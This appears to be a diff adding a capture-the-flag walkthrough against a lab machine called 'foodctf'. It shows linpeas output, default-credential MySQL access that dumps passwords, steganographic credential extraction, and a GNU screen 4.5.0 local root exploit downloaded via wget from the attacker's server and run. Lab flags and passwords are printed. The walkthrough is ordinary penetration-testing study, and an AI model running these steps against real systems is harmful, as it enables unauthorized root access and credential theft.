@@ -1691,3 +1691,850 @@ Found /var/lib/mlocate/mlocate.db: regular file, no read permission
 /snap/core/8689/run/lock
 /snap/core/8689/tmp
 /snap/core/8689/var/tmp
+/tmp
+/tmp/.font-unix
+/tmp/.ICE-unix
+/tmp/linpeas.sh
+/tmp/.Test-unix
+/tmp/tmux-1004
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/crash
+/var/lib/lxcfs/cgroup/memory/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/atd.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/cron.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/img.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/inetd.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/koth.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-lvmetad.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/lxcfs.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/lxd.socket/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/mysql.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/networkd-dispatcher.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/pings.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/polkit.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/snap-core-7270.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/snap-core-8689.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/snapd.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/snapd.socket/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-config.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-networkd.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-resolved.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/system-serialx2dgetty.slice/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/unattended-upgrades.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control
+/var/tmp
+
+╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
+  Group bread:
+/etc/systemd/system/pings.service
+
+╔══════════╣ Searching passwords in history files
+
+╔══════════╣ Searching *password* or *credential* files in home (limit 70)
+/bin/systemd-ask-password
+/bin/systemd-tty-ask-password-agent
+/etc/pam.d/common-password
+/usr/lib/git-core/git-credential
+/usr/lib/git-core/git-credential-cache
+/usr/lib/git-core/git-credential-cache--daemon
+/usr/lib/git-core/git-credential-store
+  #)There are more creds/passwds files in the previous parent folder
+
+/usr/lib/grub/i386-pc/password.mod
+/usr/lib/grub/i386-pc/password_pbkdf2.mod
+/usr/lib/mysql/plugin/validate_password.so
+/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py
+/usr/lib/python3/dist-packages/cloudinit/config/__pycache__/cc_set_passwords.cpython-36.pyc
+/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py
+/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/client_credentials.cpython-36.pyc
+/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-36.pyc
+/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py
+/usr/lib/python3/dist-packages/twisted/cred/credentials.py
+/usr/lib/python3/dist-packages/twisted/cred/__pycache__/credentials.cpython-36.pyc
+/usr/share/dns/root.key
+/usr/share/doc/git/contrib/credential
+/usr/share/doc/git/contrib/credential/gnome-keyring/git-credential-gnome-keyring.c
+/usr/share/doc/git/contrib/credential/libsecret/git-credential-libsecret.c
+/usr/share/doc/git/contrib/credential/netrc/git-credential-netrc
+/usr/share/doc/git/contrib/credential/osxkeychain/git-credential-osxkeychain.c
+/usr/share/doc/git/contrib/credential/wincred/git-credential-wincred.c
+
+╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
+
+╔══════════╣ Searching passwords inside logs (limit 70)
+,960 - ssh_util.py[DEBUG]: line 123: option PasswordAuthentication added with yes
+,997 - cc_set_passwords.py[DEBUG]: Restarted the ssh daemon.
+,997 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords ran successfully
+,328 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,328 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,272 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,272 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,353 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,353 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,169 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,169 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,470 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,470 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,093 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,093 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,301 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,301 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,776 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,776 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,062 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,062 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,670 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,670 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,528 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,528 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,296 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,296 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,077 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,077 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,785 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,786 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,886 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,886 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,538 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,538 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+ base-passwd depends on libc6 (>= 2.8); however:
+ base-passwd depends on libdebconfclient0 (>= 0.145); however:
+Binary file /var/log/journal/c214c9d4231b4554bf4c0d97704f5dcf/user-1004.journal matches
+dpkg: base-passwd: dependency problems, but configuring anyway as you requested:
+Mar 19 15:55:21 ubuntu-server systemd[1]: Started Dispatch Password Requests to Console Directory Watch.
+Mar 19 15:55:21 ubuntu-server systemd[1]: Started Forward Password Requests to Wall Directory Watch.
+Mar 19 16:02:56 ubuntu-server chage[14112]: changed password expiry for sshd
+Mar 19 16:02:56 ubuntu-server usermod[14107]: change user 'sshd' password
+Preparing to unpack .../base-passwd_3.5.44_amd64.deb ...
+Preparing to unpack .../passwd_1%3a4.5-1ubuntu1_amd64.deb ...
+Selecting previously unselected package base-passwd.
+Selecting previously unselected package passwd.
+Setting up base-passwd (3.5.44) ...
+Setting up passwd (1:4.5-1ubuntu1) ...
+Shadow passwords are now on.
+Unpacking base-passwd (3.5.44) ...
+Unpacking base-passwd (3.5.44) over (3.5.44) ...
+Unpacking passwd (1:4.5-1ubuntu1) ...
+
+                                ╔════════════════╗
+════════════════════════════════╣ API Keys Regex ╠════════════════════════════════
+                                ╚════════════════╝
+Regexes to search for API keys aren't activated, use param '-r' 
+
+Found ╔══════════╣ CVEs Check
+Vulnerable to CVE-2021-4034 and ═╣ MySQL connection using default root/root ........... Yes
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ mysql -h 10.10.241.181 -u root -p
+Enter password: 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MySQL connection id is 16
+Server version: 5.7.29-0ubuntu0.18.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MySQL [(none)]> show datbases;
+ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'datbases' at line 1
+MySQL [(none)]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
+| users              |
++--------------------+
+5 rows in set (0.204 sec)
+
+MySQL [(none)]> use users;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MySQL [users]> show tables;
++-----------------+
+| Tables_in_users |
++-----------------+
+| User            |
++-----------------+
+1 row in set (0.198 sec)
+
+MySQL [users]> select * from User;
++----------+---------------------------------------+
+| username | password                              |
++----------+---------------------------------------+
+| ramen    | noodlesRTheBest                       |
+| flag     | thm{2f30841ff8d9646845295135adda8332} |
++----------+---------------------------------------+
+2 rows in set (0.202 sec)
+
+bread@foodctf:/home$ su ramen
+su ramen
+Password: noodlesRTheBest
+
+ramen@foodctf:~$ sudo -l
+sudo -l
+[sudo] password for ramen: noodlesRTheBest
+               
+Sorry, user ramen may not run sudo on foodctf.
+
+┌──(witty㉿kali)-[~/bug_hunter]
+└─$ ssh ramen@10.10.241.181
+ramen@10.10.241.181's password: 
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat Feb 18 16:52:53 UTC 2023
+
+  System load:  0.01              Processes:           101
+  Usage of /:   43.7% of 9.78GB   Users logged in:     0
+  Memory usage: 55%               IP address for eth0: 10.10.241.181
+  Swap usage:   0%
+
+0 packages can be updated.
+0 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Sat Feb 18 16:47:54 2023 from 10.8.19.103
+ramen@foodctf:~$ sudo -l
+[sudo] password for ramen:                
+Sorry, user ramen may not run sudo on foodctf.
+ramen@foodctf:~$ sudo -l
+[sudo] password for ramen: ***************
+
+*****?
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ nc 10.10.241.181 16109
+whoami
+HTTP/1.1 400 Bad Request
+Content-Type: text/plain; charset=utf-8
+Connection: close
+
+400 Bad Request  
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ curl http://10.10.241.181:16109
+Warning: Binary output can mess up your terminal. Use "--output -" to tell 
+Warning: curl to output it to your terminal anyway, or consider "--output 
+Warning: <FILE>" to save to a file.
+                                                                                   
+┌──(witty㉿kali)-[~/Downloads]
+└─$ curl http://10.10.241.181:16109 --output filekoth
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  372k    0  372k    0     0   282k      0 --:--:--  0:00:01 --:--:--  282k
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ file filekoth        
+filekoth: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, baseline, precision 8, 1350x900, components 3
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ binwalk -e filekoth 
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             JPEG image data, JFIF standard 1.01
+381172        0x5D0F4         gzip compressed data, from Unix, last modified: 
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ cd _filekoth.extracted                           
+                                                                                   
+┌──(witty㉿kali)-[~/Downloads/_filekoth.extracted]
+└─$ ls
+5D0F4  5D0F4.gz
+
+┌──(witty㉿kali)-[~/Downloads/_filekoth.extracted]
+└─$ cat 5D0F4             
+creds.txt0000644000000000000000000000002513634770536011430 0ustar  rootrootpasta:pastaisdynamic
+
+or just
+
+no passphrase
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ steghide extract -sf filekoth  
+Enter passphrase: 
+wrote extracted data to "creds.txt".
+                                                                                   
+┌──(witty㉿kali)-[~/Downloads]
+└─$ cat creds.txt 
+pasta:pastaisdynamic
+
+ramen@foodctf:~$ su pasta
+Password: 
+pasta@foodctf:/home/ramen$ cd /home/pasta
+pasta@foodctf:~$ ls
+pasta@foodctf:~$ ls -lah
+total 28K
+drwxr-xr-x 4 pasta pasta 4.0K Mar 21  2020 .
+drwxr-xr-x 7 root  root  4.0K Mar 28  2020 ..
+-rw-r--r-- 1 pasta pasta  220 Mar 20  2020 .bash_logout
+-rw-r--r-- 1 pasta pasta 3.7K Mar 20  2020 .bashrc
+drwx------ 2 pasta pasta 4.0K Mar 21  2020 .cache
+drwx------ 3 pasta pasta 4.0K Mar 21  2020 .gnupg
+-rw-r--r-- 1 pasta pasta  825 Mar 28  2020 .profile
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ telnet 10.10.241.181 46969
+Trying 10.10.241.181...
+Connected to 10.10.241.181.
+Escape character is '^]'.
+tccr:uwjsasqccywsg
+
+https://www.dcode.fr/caesar-cipher
+
+food:givemecookies
+
+──(witty㉿kali)-[~/Downloads]
+└─$ telnet 10.10.241.181 46969
+Trying 10.10.241.181...
+Connected to 10.10.241.181.
+Escape character is '^]'.
+tccr:uwjsasqccywsg
+foodctf login: food
+Password: 
+Last login: Sat Mar 21 00:20:49 UTC 2020 on tty1
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat Feb 18 17:17:45 UTC 2023
+
+  System load:  0.0               Processes:           107
+  Usage of /:   44.1% of 9.78GB   Users logged in:     1
+  Memory usage: 56%               IP address for eth0: 10.10.241.181
+  Swap usage:   0%
+
+0 packages can be updated.
+0 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+food@foodctf:~$ whoami
+-bash: whoami: No such file or directory
+food@foodctf:~$ ls
+-bash: ls: No such file or directory
+food@foodctf:~$ ls -lah
+-bash: ls: No such file or directory
+food@foodctf:~$ pwd
+/home/food
+food@foodctf:~$ cd /root
+-bash: cd: /root: Permission denied
+food@foodctf:~$ cd /home
+food@foodctf:/home$ ls
+-bash: ls: No such file or directory
+
+uhmm
+
+pasta@foodctf:/tmp$ su food
+Password: 
+food@foodctf:/tmp$ cd /home/food
+food@foodctf:~$ ls -lah
+total 40K
+drwxr-xr-x 5 food food 4.0K Mar 30  2020 .
+drwxr-xr-x 7 root root 4.0K Mar 28  2020 ..
+-rw-r--r-- 1 food food  220 Mar 19  2020 .bash_logout
+-rw-r--r-- 1 food food 3.7K Mar 19  2020 .bashrc
+drwx------ 2 food food 4.0K Mar 19  2020 .cache
+-rw-rw-r-- 1 food food   38 Mar 28  2020 .flag
+drwx------ 3 food food 4.0K Mar 19  2020 .gnupg
+drwxrwxr-x 3 food food 4.0K Mar 19  2020 .local
+-rw------- 1 food food   23 Mar 19  2020 .mysql_history
+-rw-r--r-- 1 food food  815 Mar 28  2020 .profile
+food@foodctf:~$ cat .flag
+thm{58a3cb46855af54d0660b34fd20a04c1}
+food@foodctf:~$ cat .mysql_history 
+_HiStOrY_V2_
+ls
+;
+exit
+
+2 flags
+
+food@foodctf:~$ find / -type f -name flag* 2>/dev/null
+/sys/devices/pnp0/00:06/tty/ttyS0/flags
+/sys/devices/platform/serial8250/tty/ttyS15/flags
+/sys/devices/platform/serial8250/tty/ttyS6/flags
+/sys/devices/platform/serial8250/tty/ttyS23/flags
+/sys/devices/platform/serial8250/tty/ttyS13/flags
+/sys/devices/platform/serial8250/tty/ttyS31/flags
+/sys/devices/platform/serial8250/tty/ttyS4/flags
+/sys/devices/platform/serial8250/tty/ttyS21/flags
+/sys/devices/platform/serial8250/tty/ttyS11/flags
+/sys/devices/platform/serial8250/tty/ttyS2/flags
+/sys/devices/platform/serial8250/tty/ttyS28/flags
+/sys/devices/platform/serial8250/tty/ttyS18/flags
+/sys/devices/platform/serial8250/tty/ttyS9/flags
+/sys/devices/platform/serial8250/tty/ttyS26/flags
+/sys/devices/platform/serial8250/tty/ttyS16/flags
+/sys/devices/platform/serial8250/tty/ttyS7/flags
+/sys/devices/platform/serial8250/tty/ttyS24/flags
+/sys/devices/platform/serial8250/tty/ttyS14/flags
+/sys/devices/platform/serial8250/tty/ttyS5/flags
+/sys/devices/platform/serial8250/tty/ttyS22/flags
+/sys/devices/platform/serial8250/tty/ttyS12/flags
+/sys/devices/platform/serial8250/tty/ttyS30/flags
+/sys/devices/platform/serial8250/tty/ttyS3/flags
+/sys/devices/platform/serial8250/tty/ttyS20/flags
+/sys/devices/platform/serial8250/tty/ttyS10/flags
+/sys/devices/platform/serial8250/tty/ttyS29/flags
+/sys/devices/platform/serial8250/tty/ttyS1/flags
+/sys/devices/platform/serial8250/tty/ttyS19/flags
+/sys/devices/platform/serial8250/tty/ttyS27/flags
+/sys/devices/platform/serial8250/tty/ttyS17/flags
+/sys/devices/platform/serial8250/tty/ttyS8/flags
+/sys/devices/platform/serial8250/tty/ttyS25/flags
+/sys/devices/virtual/net/lo/flags
+/sys/devices/vif-0/net/eth0/flags
+/usr/src/linux-headers-4.15.0-91/scripts/coccinelle/locks/flags.cocci
+/usr/src/linux-headers-4.15.0-91-generic/include/config/arch/uses/high/vma/flags.h
+/home/tryhackme/flag7
+/home/bread/flag
+/var/flag.txt
+food@foodctf:~$ cat /var/flag.txt
+thm{0c48608136e6f8c86aecdb5d4c3d7ba8}
+
+food@foodctf:~$ ls -l /home/tryhackme/flag7
+-rw-rw---- 1 tryhackme tryhackme 38 Mar 27  2020 /home/tryhackme/flag7
+food@foodctf:~$ ls -l /home/bread/flag
+----r--r-- 1 bread bread 38 Mar 28  2020 /home/bread/flag
+
+3 flags
+
+food@foodctf:~$ find / -perm -4000 2>/dev/null | xargs ls -lah
+-rwsr-xr-x 1 root   root             31K Aug 11  2016 /bin/fusermount
+-rwsr-xr-x 1 root   root             43K Jan  8  2020 /bin/mount
+-rwsr-xr-x 1 root   root             63K Jun 28  2019 /bin/ping
+-rwsr-xr-x 1 root   root             44K Mar 22  2019 /bin/su
+-rwsr-xr-x 1 root   root             27K Jan  8  2020 /bin/umount
+-rwsr-xr-x 1 root   root             40K May 15  2019 /snap/core/7270/bin/mount
+-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/7270/bin/ping
+-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/7270/bin/ping6
+-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/7270/bin/su
+-rwsr-xr-x 1 root   root             27K May 15  2019 /snap/core/7270/bin/umount
+-rwsr-xr-x 1 root   root             71K Mar 25  2019 /snap/core/7270/usr/bin/chfn
+-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/7270/usr/bin/chsh
+-rwsr-xr-x 1 root   root             74K Mar 25  2019 /snap/core/7270/usr/bin/gpasswd
+-rwsr-xr-x 1 root   root             39K Mar 25  2019 /snap/core/7270/usr/bin/newgrp
+-rwsr-xr-x 1 root   root             53K Mar 25  2019 /snap/core/7270/usr/bin/passwd
+-rwsr-xr-x 1 root   root            134K Jun 10  2019 /snap/core/7270/usr/bin/sudo
+-rwsr-xr-- 1 root   systemd-resolve  42K Jun 10  2019 /snap/core/7270/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root   root            419K Mar  4  2019 /snap/core/7270/usr/lib/openssh/ssh-keysign
+-rwsr-sr-x 1 root   root            101K Jun 21  2019 /snap/core/7270/usr/lib/snapd/snap-confine
+-rwsr-xr-- 1 root   dip             386K Jun 12  2018 /snap/core/7270/usr/sbin/pppd
+-rwsr-xr-x 1 root   root             40K Jan 27  2020 /snap/core/8689/bin/mount
+-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/8689/bin/ping
+-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/8689/bin/ping6
+-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/8689/bin/su
+-rwsr-xr-x 1 root   root             27K Jan 27  2020 /snap/core/8689/bin/umount
+-rwsr-xr-x 1 root   root             71K Mar 25  2019 /snap/core/8689/usr/bin/chfn
+-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/8689/usr/bin/chsh
+-rwsr-xr-x 1 root   root             74K Mar 25  2019 /snap/core/8689/usr/bin/gpasswd
+-rwsr-xr-x 1 root   root             39K Mar 25  2019 /snap/core/8689/usr/bin/newgrp
+-rwsr-xr-x 1 root   root             53K Mar 25  2019 /snap/core/8689/usr/bin/passwd
+-rwsr-xr-x 1 root   root            134K Jan 31  2020 /snap/core/8689/usr/bin/sudo
+-rwsr-xr-- 1 root   systemd-resolve  42K Nov 29  2019 /snap/core/8689/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root   root            419K Mar  4  2019 /snap/core/8689/usr/lib/openssh/ssh-keysign
+-rwsr-sr-x 1 root   root            105K Feb 12  2020 /snap/core/8689/usr/lib/snapd/snap-confine
+-rwsr-xr-- 1 root   dip             386K Jun 12  2018 /snap/core/8689/usr/sbin/pppd
+-rwsr-sr-x 1 daemon daemon           51K Feb 20  2018 /usr/bin/at
+-rwsr-xr-x 1 root   root             75K Mar 22  2019 /usr/bin/chfn
+-rwsr-xr-x 1 root   root             44K Mar 22  2019 /usr/bin/chsh
+-rwsr-xr-x 1 root   root             75K Mar 22  2019 /usr/bin/gpasswd
+-rwsr-xr-x 1 root   root             37K Mar 22  2019 /usr/bin/newgidmap
+-rwsr-xr-x 1 root   root             40K Mar 22  2019 /usr/bin/newgrp
+-rwsr-xr-x 1 root   root             37K Mar 22  2019 /usr/bin/newuidmap
+-rwsr-xr-x 1 root   root             59K Mar 22  2019 /usr/bin/passwd
+-rwsr-xr-x 1 root   root             22K Mar 27  2019 /usr/bin/pkexec
+-rwsr-xr-x 1 root   root            1.6M Mar 20  2020 /usr/bin/screen-4.5.0
+-rwsr-xr-x 1 root   root            146K Jan 18  2018 /usr/bin/sudo
+-rwsr-xr-x 1 root   root             19K Jun 28  2019 /usr/bin/traceroute6.iputils
+-rwsr-sr-x 1 root   root            2.6M Jun  6  2019 /usr/bin/vim.basic
+-rwsr-xr-- 1 root   messagebus       42K Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root   root             10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root   root            427K Mar  4  2019 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root   root             14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-sr-x 1 root   root            107K Oct 30  2019 /usr/lib/snapd/snap-confine
+-rwsr-xr-- 1 root   telnetd          11K Nov  7  2016 /usr/lib/telnetlogin
+-rwsr-xr-x 1 root   root             99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+
+/usr/bin/screen-4.5.0
+
+https://www.exploit-db.com/exploits/41154
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ nano screenroot.sh    
+                                                        
+┌──(witty㉿kali)-[~/Downloads]
+└─$ python3 -m http.server 8000                
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.241.181 - - [18/Feb/2023 12:24:26] "GET /screenroot.sh HTTP/1.1" 200 -
+
+food@foodctf:~$ cd /tmp
+food@foodctf:/tmp$ wget http://10.8.19.103:8000/screenroot.sh
+--  http://10.8.19.103:8000/screenroot.sh
+Connecting to 10.8.19.103:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1152 (1.1K) [text/x-sh]
+Saving to: ‘screenroot.sh’
+
+screenroot.sh               100%[========================================>]   1.12K  --.-KB/s    in 0s      
+
+(112 MB/s) - ‘screenroot.sh’ saved [1152/1152]
+
+food@foodctf:/tmp$ chmod +x screenroot.sh 
+food@foodctf:/tmp$ ./screenroot.sh 
+~ gnu/screenroot ~
+[+] First, we create our shell and library...
+/tmp/libhax.c: In function ‘dropshell’:
+/tmp/libhax.c:7:5: warning: implicit declaration of function ‘chmod’; did you mean ‘chroot’? [-Wimplicit-function-declaration]
+     chmod("/tmp/rootshell", 04755);
+     ^~~~~
+     chroot
+/tmp/rootshell.c: In function ‘main’:
+/tmp/rootshell.c:3:5: warning: implicit declaration of function ‘setuid’; did you mean ‘setbuf’? [-Wimplicit-function-declaration]
+     setuid(0);
+     ^~~~~~
+     setbuf
+/tmp/rootshell.c:4:5: warning: implicit declaration of function ‘setgid’; did you mean ‘setbuf’? [-Wimplicit-function-declaration]
+     setgid(0);
+     ^~~~~~
+     setbuf
+/tmp/rootshell.c:5:5: warning: implicit declaration of function ‘seteuid’; did you mean ‘setbuf’? [-Wimplicit-function-declaration]
+     seteuid(0);
+     ^~~~~~~
+     setbuf
+/tmp/rootshell.c:6:5: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration]
+     setegid(0);
+     ^~~~~~~
+/tmp/rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]
+     execvp("/bin/sh", NULL, NULL);
+     ^~~~~~
+[+] Now we create our /etc/ld.so.preload file...
+[+] Triggering...
+' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+[+] done!
+No Sockets found in /tmp/screens/S-food.
+```
+```text
+# whoami
+root
+
+after executing koth 😂
+```
+```text
+# ␊│␋├
+°⎺⎺␍@°⎺⎺␍␌├°:/├└⎻$ ┌⎽
+°           ⎽␌⎼␊␊┼⎼⎺⎺├.⎽␤                                                                      ├└┤│-1002
+┌␋␉␤▒│.⎽⎺   ⎽␌⎼␊␊┼⎽                                                                            ├└┤│-1003
+┌␋┼⎻␊▒⎽.⎽␤  ⎽≤⎽├␊└␍-⎻⎼␋┴▒├␊-614␌␌45266␊24␌36▒␉7892▒0␍49␌▒090-⎽≤⎽├␊└␍-⎼␊⎽⎺┌┴␊␍.⎽␊⎼┴␋␌␊-␍␍JD⎺I   ├└┤│-1004
+⎼⎺⎺├⎽␤␊┌┌   ⎽≤⎽├␊└␍-⎻⎼␋┴▒├␊-614␌␌45266␊24␌36▒␉7892▒0␍49␌▒090-⎽≤⎽├␊└␍-├␋└␊⎽≤┼␌␍.⎽␊⎼┴␋␌␊-⎻YP±9├
+°⎺⎺␍@°⎺⎺␍␌├°:/├└⎻$ ┌⎽
+
+──(witty㉿kali)-[~/Downloads]
+└─$ ssh food@10.10.241.181 
+food@10.10.241.181's password: 
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat Feb 18 17:28:27 UTC 2023
+
+  System load:  0.0               Processes:           103
+  Usage of /:   44.3% of 9.78GB   Users logged in:     0
+  Memory usage: 56%               IP address for eth0: 10.10.241.181
+  Swap usage:   0%
+
